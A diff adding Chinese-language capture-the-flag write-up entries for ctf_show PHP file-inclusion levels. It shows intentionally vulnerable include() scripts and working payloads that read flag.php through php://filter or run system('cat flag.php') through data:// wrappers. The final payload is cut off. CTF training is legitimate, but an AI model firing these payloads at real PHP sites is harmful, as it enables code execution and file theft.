@@ -6259,4 +6259,186 @@ payload:`?c=include%0a$_GET["url"]?>&url=php://filter/read=convert.base64-encode
 
     c=?><?=include$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php
 
+### ctf_show web33
+
+**payload:**
+
+~~~
+?c=include%0a$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php
+~~~
+
+### **ctf_show web34**
+
+**payload同上一关卡**
+
+
+
+### **ctf_show web35**
+
+**payload同上一关卡**
+
+
+
+### ctf_show web36
+
+**payload**:
+
+~~~url
+?c=include$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php
+~~~
+
+
+
+### ctf_show web37
+
+~~~php
+ <?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-04 00:12:34
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-04 05:18:55
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+*/
+
+//flag in flag.php
+error_reporting(0);
+if(isset($_GET['c'])){
+    $c = $_GET['c'];
+    if(!preg_match("/flag/i", $c)){ // 限制逃逸
+        include($c);
+        echo $flag;
+    
+    }
+        
+}else{
+    highlight_file(__FILE__);
+} 
+~~~
+
+**payload:**
+
+~~~
+?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==
+~~~
+
+
+
+### ctf_show web38
+
+~~~php
+ <?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-04 00:12:34
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-04 05:23:36
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+*/
+
+//flag in flag.php
+error_reporting(0);
+if(isset($_GET['c'])){
+    $c = $_GET['c'];
+    if(!preg_match("/flag|php|file/i", $c)){
+        include($c);
+        echo $flag;
+    
+    }
+        
+}else{
+    highlight_file(__FILE__);
+} 
+~~~
+
+
+
+**payload:**
+
+~~~
+?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==
+~~~
+
+
+
+### ctf_show web39
+
+~~~php
+ <?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-04 00:12:34
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-04 06:13:21
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+*/
+
+//flag in flag.php
+error_reporting(0);
+if(isset($_GET['c'])){
+    $c = $_GET['c'];
+    if(!preg_match("/flag/i", $c)){
+        include($c.".php");
+    }
+        
+}else{
+    highlight_file(__FILE__);
+} 
+~~~
+
+**payload:**
+
+~~~
+?c=data://text/plain,<?php system("cat fl*");?>
+~~~
+
+base64编码并不能执行成功，原因应该是
+
+$c参数内容和.php内容拼接，导致base64不能解码成功
+
+> c=data://text/plain;base64,`PD9waHAgcGhwaW5mbygpOz8+.php`
+
+
+
+### ctf_show web78
+
+~~~php
+ <?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-16 10:52:43
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-16 10:54:20
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET['file'])){
+    $file = $_GET['file'];
+    include($file);
+}else{
+    highlight_file(__FILE__);
+} 
+~~~
+
+
+
+**payload:**
+
+~~~
+?file=php://filter/read=convert.base64-encode/re
+~~~
 
